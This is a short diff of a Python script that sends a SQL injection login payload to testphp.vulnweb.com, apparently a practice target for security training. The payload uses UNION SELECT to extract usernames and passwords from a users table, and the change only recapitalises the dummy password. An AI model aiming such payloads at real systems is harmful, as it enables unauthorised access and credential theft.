@@ -4,7 +4,7 @@ url = "http://testphp.vulnweb.com/userinfo.php"
 
 payload = {
     "uname": "' UNION SELECT null, null, username, password FROM users -- ",
-    "pass": "Anything can be passowrd"
+    "pass": "Anything Can Be Passowrd"
 }
 
 response = requests.post(url, data=payload)
